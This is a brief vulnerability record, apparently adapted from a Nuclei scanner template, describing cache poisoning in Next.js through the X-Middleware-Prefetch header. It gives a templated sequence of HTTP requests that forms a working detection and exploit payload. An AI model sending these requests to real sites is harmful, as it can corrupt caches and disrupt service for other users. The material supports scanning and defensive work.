# Vulnerability: Next.js - Cache Poisoning
**Classification:** NEXTJS
**Source:** Nuclei Template (`nextjs-middleware-cache.yaml`)

## Description
Next.js is vulnerable to Cache Poisoning using X-Middleware-Prefetch.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /?cb={{rand}} HTTP/1.1
Host: {{Hostname}}
X-Middleware-Prefetch: 1
Priority: u=1

@timeout: 10s
GET /?cb={{rand}} HTTP/1.1
Host: {{Hostname}}
X-Middleware-Prefetch: 1
Priority: u=1

@timeout: 10s
GET /?cb={{rand}} HTTP/1.1
Host: {{Hostname}}
```

